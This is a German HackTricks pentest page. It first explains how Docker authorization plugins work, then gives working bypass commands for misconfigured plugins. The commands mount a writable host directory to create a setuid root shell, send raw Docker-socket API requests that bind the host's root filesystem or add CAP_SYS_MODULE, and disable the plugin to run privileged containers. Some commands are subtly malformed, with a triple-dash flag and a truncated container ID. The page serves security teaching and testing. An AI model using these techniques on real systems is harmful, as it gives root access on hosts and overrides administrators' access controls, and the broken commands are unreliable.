<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


Das **Autorisierungsmodell** von Docker ist standardmäßig **alles oder nichts**. Jeder Benutzer mit Berechtigung zum Zugriff auf den Docker-Daemon kann **beliebige** Docker-Client-Befehle **ausführen**. Das Gleiche gilt für Anrufer, die über die Engine-API von Docker auf den Daemon zugreifen. Wenn Sie eine **größere Zugriffskontrolle** benötigen, können Sie **Autorisierungsplugins** erstellen und sie Ihrer Docker-Daemon-Konfiguration hinzufügen. Mit einem Autorisierungsplugin kann ein Docker-Administrator **granulare Zugriffsrichtlinien** konfigurieren, um den Zugriff auf den Docker-Daemon zu verwalten.

# Grundlegende Architektur

Docker Auth-Plugins sind **externe Plugins**, die Sie verwenden können, um **Aktionen** an den Docker-Daemon **je nach Benutzer** und **angeforderter Aktion** **zu erlauben/verweigern**.

**[Die folgenden Informationen stammen aus der Dokumentation](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Wenn eine **HTTP-Anfrage** über die CLI oder über die Engine-API an den Docker-Daemon gestellt wird, leitet das **Authentifizierungs-Subsystem** die Anfrage an das installierte **Authentifizierungsplugin**(s) weiter. Die Anfrage enthält den Benutzer (Anrufer) und den Befehlskontext. Das **Plugin** ist dafür verantwortlich, ob die Anfrage **zugelassen** oder **verweigert** wird.

Die folgenden Sequenzdiagramme zeigen den Ablauf der Autorisierung bei Zulassung und Verweigerung:

![Autorisierung bei Zulassung](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Autorisierung bei Verweigerung](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Jede Anfrage, die an das Plugin gesendet wird, **enthält den authentifizierten Benutzer, die HTTP-Header und den Anfrage-/Antwortkörper**. Nur der **Benutzername** und die **verwendete Authentifizierungsmethode** werden an das Plugin übergeben. Am wichtigsten ist, dass **keine Benutzeranmeldeinformationen** oder Tokens übergeben werden. Schließlich werden **nicht alle Anfrage-/Antwortkörper** an das Autorisierungsplugin gesendet. Nur Anfrage-/Antwortkörper, bei denen der `Content-Type` entweder `text/*` oder `application/json` ist, werden gesendet.

Für Befehle, die die HTTP-Verbindung übernehmen können (`HTTP Upgrade`), wie z.B. `exec`, wird das Autorisierungsplugin nur für die anfänglichen HTTP-Anfragen aufgerufen. Sobald das Plugin den Befehl genehmigt hat, wird die Autorisierung nicht auf den Rest des Ablaufs angewendet. Insbesondere werden die Streaming-Daten nicht an die Autorisierungsplugins weitergeleitet. Für Befehle, die eine chunked HTTP-Antwort zurückgeben, wie z.B. `logs` und `events`, wird nur die HTTP-Anfrage an die Autorisierungsplugins gesendet.

Während der Verarbeitung von Anfragen/Antworten müssen einige Autorisierungsflüsse zusätzliche Abfragen an den Docker-Daemon durchführen. Um solche Flüsse abzuschließen, können Plugins die Daemon-API ähnlich wie ein regulärer Benutzer aufrufen. Um diese zusätzlichen Abfragen zu ermöglichen, muss das Plugin die Möglichkeit bieten, dass ein Administrator die entsprechenden Authentifizierungs- und Sicherheitsrichtlinien konfigurieren kann.

## Mehrere Plugins

Sie sind dafür verantwortlich, Ihr Plugin als Teil des Docker-Daemon-Startvorgangs **zu registrieren**. Sie können **mehrere Plugins installieren und miteinander verketten**. Diese Kette kann geordnet sein. Jede Anfrage an den Daemon durchläuft nacheinander die Kette. Nur wenn **alle Plugins den Zugriff** auf die Ressource gewähren, wird der Zugriff gewährt.

# Plugin-Beispiele

## Twistlock AuthZ Broker

Das Plugin [**authz**](https://github.com/twistlock/authz) ermöglicht es Ihnen, eine einfache **JSON**-Datei zu erstellen, die das Plugin zum Autorisieren der Anfragen liest. Dadurch haben Sie die Möglichkeit, sehr einfach zu steuern, welche API-Endpunkte von jedem Benutzer erreicht werden können.

Hier ist ein Beispiel, das Alice und Bob das Erstellen neuer Container ermöglicht: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Auf der Seite [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) finden Sie die Beziehung zwischen der angeforderten URL und der Aktion. Auf der Seite [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) finden Sie die Beziehung zwischen dem Aktionsnamen und der Aktion.

## Einfaches Plugin-Tutorial

Sie finden ein **einfach zu verstehendes Plugin** mit detaillierten Informationen zur Installation und Fehlerbehebung hier: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lesen Sie das `README` und den Code `plugin.go`, um zu verstehen, wie es funktioniert.

# Docker Auth Plugin Bypass

## Zugriff ermitteln

Die wichtigsten Dinge, die überprüft werden müssen, sind **welche Endpunkte erlaubt sind** und **welche Werte von HostConfig erlaubt sind**.

Um diese Aufzählung durchzuführen, können Sie das Tool [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)** verwenden**.

## Nicht erlaubtes `run --privileged`

### Mindestberechtigungen
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Ausführen eines Containers und anschließendes Erhalten einer privilegierten Sitzung

In diesem Fall hat der Systemadministrator Benutzern untersagt, Volumes zu mounten und Container mit der `--privileged`-Flag oder zusätzlichen Berechtigungen für den Container auszuführen:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Jedoch kann ein Benutzer **eine Shell innerhalb des laufenden Containers erstellen und ihm zusätzliche Berechtigungen geben**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Nun kann der Benutzer mithilfe einer der zuvor besprochenen Techniken aus dem Container ausbrechen und **Berechtigungen im Hostsystem eskalieren**.

## Mounten eines beschreibbaren Ordners

In diesem Fall hat der Systemadministrator **Benutzern untersagt, Container mit dem `--privileged`-Flag** auszuführen oder dem Container zusätzliche Berechtigungen zu geben. Es ist nur erlaubt, den Ordner `/tmp` zu mounten:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Beachten Sie, dass Sie möglicherweise den Ordner `/tmp` nicht einbinden können, aber Sie können einen **anderen beschreibbaren Ordner** einbinden. Sie können beschreibbare Verzeichnisse mit dem Befehl `find / -writable -type d 2>/dev/null` finden.

**Beachten Sie, dass nicht alle Verzeichnisse auf einem Linux-System das suid-Bit unterstützen!** Um zu überprüfen, welche Verzeichnisse das suid-Bit unterstützen, führen Sie den Befehl `mount | grep -v "nosuid"` aus. Zum Beispiel unterstützen normalerweise `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` und `/var/lib/lxcfs` das suid-Bit nicht.

Beachten Sie auch, dass Sie, wenn Sie `/etc` oder einen anderen Ordner **mit Konfigurationsdateien** einbinden können, diese als Root im Docker-Container ändern können, um sie im Host zu missbrauchen und Privilegien zu eskalieren (z. B. Änderung von `/etc/shadow`).
{% endhint %}

## Nicht überprüfter API-Endpunkt

Die Verantwortung des Systemadministrators bei der Konfiguration dieses Plugins besteht darin, zu kontrollieren, welche Aktionen und mit welchen Berechtigungen jeder Benutzer durchführen kann. Wenn der Administrator jedoch eine **Blacklist**-Ansatz für die Endpunkte und Attribute wählt, besteht die Möglichkeit, dass er einige vergisst, die es einem Angreifer ermöglichen könnten, Privilegien zu eskalieren.

Sie können die Docker-API unter [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#) überprüfen.

## Nicht überprüfte JSON-Struktur

### Binds im Root-Verzeichnis

Es ist möglich, dass der Systemadministrator bei der Konfiguration der Docker-Firewall einen wichtigen Parameter der [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) wie "**Binds**" vergessen hat.\
Im folgenden Beispiel ist es möglich, diese Fehlkonfiguration auszunutzen, um einen Container zu erstellen und auszuführen, der das Root-Verzeichnis (/) des Hosts einbindet:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Beachten Sie, wie in diesem Beispiel der Parameter **`Binds`** als Schlüssel auf der obersten Ebene im JSON verwendet wird, aber in der API unter dem Schlüssel **`HostConfig`** erscheint.
{% endhint %}

### Binds in HostConfig

Befolgen Sie die gleiche Anweisung wie bei **Binds in root**, indem Sie diese **Anfrage** an die Docker API senden:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts im Root-Verzeichnis

Befolgen Sie die gleiche Anleitung wie bei **Binds im Root-Verzeichnis**, indem Sie diese **Anfrage** an die Docker API senden:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Folgen Sie den gleichen Anweisungen wie bei **Binds in root**, indem Sie diese **Anfrage** an die Docker API senden:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Nicht überprüftes JSON-Attribut

Es ist möglich, dass der Sysadmin bei der Konfiguration der Docker-Firewall ein **wichtiges Attribut eines Parameters** der [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) wie "**Capabilities**" innerhalb von "**HostConfig**" vergessen hat. Im folgenden Beispiel ist es möglich, diese Fehlkonfiguration auszunutzen, um einen Container mit der **SYS\_MODULE**-Fähigkeit zu erstellen und auszuführen:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Die **`HostConfig`** ist der Schlüssel, der normalerweise die **interessanten** **Privilegien** enthält, um aus dem Container auszubrechen. Beachten Sie jedoch, wie wir zuvor besprochen haben, dass die Verwendung von Binds außerhalb davon auch funktioniert und es Ihnen ermöglichen kann, Beschränkungen zu umgehen.
{% endhint %}

## Deaktivieren des Plugins

Wenn der **Sysadmin** vergessen hat, die Möglichkeit zu **verbieten**, das **Plugin** zu deaktivieren, können Sie dies nutzen, um es vollständig zu deaktivieren!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Denken Sie daran, das Plugin nach dem Eskalieren **wieder zu aktivieren**, da sonst ein **Neustart des Docker-Dienstes nicht funktioniert**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Referenzen

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
